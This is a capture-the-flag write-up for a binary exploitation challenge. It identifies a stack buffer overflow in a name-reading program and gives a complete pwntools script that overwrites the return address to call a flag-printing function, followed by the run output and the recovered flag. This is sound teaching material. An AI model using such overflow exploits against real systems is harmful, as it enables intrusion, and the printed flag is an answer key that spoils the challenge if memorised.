
# Plague of Frogs

## Description

> > “I will smite all your territory with frogs. So the river shall bring forth frogs abundantly, which shall go up and come into your house, into your bedroom, on your bed, into the houses of your servants, on your people, into your ovens, and into your kneading bowls. And the frogs shall come up on you, on your people, and on all your servants.” (Exodus 8:2-4).
> 
> You will be delving into the tale of the puzzling demise of frogs that troubled the wetlands. Can you unveil the enigmas concealed within and crack the puzzle?

A binary file and a server address were attached.

## Solution

Let's run the attached binary:

```console
┌──(user@kali)-[/media/sf_CTFs/basmach/Plague_of_frogs]
└─$ ./frog
What is your name?
test
Goodbye test!
```

The program reads a name from the user, prints it and exits.

Inspecting the disassembly with Ghidra, we can see a very simple `main` function:

```c
undefined8 main(void)
{
  undefined local_78 [112];
  
  puts("What is your name? ");
  fflush(stdout);
  __isoc99_scanf("%129s",local_78);
  printf("Goodbye %s!\n",local_78);
  return 0;
}
```

We can also spot a clear vulnerability: `scanf` reads up to `129` bytes into a buffer of `112` bytes! We might be able to use this to overwrite the return address and jump somewhere else. Where to? Well, luckily we have the following function as well:

```c
undefined8 jump(void)
{
  ssize_t sVar1;
  undefined8 local_28;
  undefined8 local_20;
  undefined8 local_18;
  undefined2 local_10;
  int local_c;
  
  local_28 = 0;
  local_20 = 0;
  local_18 = 0;
  local_10 = 0;
  local_c = open("flag",0x100);
  sVar1 = read(local_c,&local_28,0x1a);
  if (sVar1 != 0x1a) {
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  puts((char *)&local_28);
  fflush(stdout);
  return 0;
}
```

This function will print the flag. 

One last check before we proceed:

```console
┌──(user@kali)-[/media/sf_CTFs/basmach/Plague_of_frogs]
└─$ checksec ./frog
[*] '/media/sf_CTFs/basmach/Plague_of_frogs/frog'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

No canary, no PIE. So we're good to go with the following basic `pwntools` exploit script:

```python
# First generate a pwntools template with:
# $ pwn template --host 20.166.26.247 --port 1337 ./frog

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

import os

def get_overflow_offset():
    # It's problematic to create a core dump on an NTFS file system,
    # so reconfigure core dumps to be created elsewhere
    with open("/proc/sys/kernel/core_pattern") as f:
        core_pattern = f.read()
        if core_pattern.strip() == "core":
            from pathlib import Path
            raise Exception("Please run the following command first:\n"
                            "mkdir -p {0} && "
                            "sudo bash -c 'echo {0}/core_dump > /proc/sys/kernel/core_pattern'"
                            .format(Path.home() / "core"))
    #os.system("echo ~/core/core_dump > /proc/sys/kernel/core_pattern")
    os.system("rm core.* > /dev/null")
    proc = process(exe.path)
    payload = cyclic(130, n = exe.bytes)
    proc.sendline(payload)
    proc.wait()
    offset = cyclic_find(proc.corefile.fault_addr, n = exe.bytes )
    log.info("Overflow offset: {}".format(offset))
    return offset

overflow_offset = get_overflow_offset()
log.info(f"jump() address: {hex(exe.symbols['jump'])}")

payload = fit({overflow_offset: p64(exe.symbols['jump'])})

io = start()
io.sendline(payload)
io.readline()
io.readline()
log.success(f"Flag: {io.readlineS()}")
```

Output:

```console
┌──(user@kali)-[/media/sf_CTFs/basmach/Plague_of_frogs]
└─$ python3 exploit.py
[*] '/media/sf_CTFs/basmach/Plague_of_frogs/frog'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Starting local process '/media/sf_CTFs/basmach/Plague_of_frogs/frog': pid 2420
[*] Process '/media/sf_CTFs/basmach/Plague_of_frogs/frog' stopped with exit code -11 (SIGSEGV) (pid 2420)
[+] Parsing corefile...: Done                                                                                                                                                      [*] '/media/sf_CTFs/basmach/Plague_of_frogs/core.2420'
    Arch:      amd64-64-little
    RIP:       0x4012de
    RSP:       0x7ffece2b0cd8
    Exe:       '/media/sf_CTFs/basmach/Plague_of_frogs/frog' (0x400000)
    Fault:     0x6161616161616170
[*] Overflow offset: 120
[*] jump() address: 0x4011f6
[+] Opening connection to 20.166.26.247 on port 1337: Done
[+] Flag: BSMCH{PR0T3CTED_F00D}
[*] Closed connection to 20.166.26.247 port 1337
```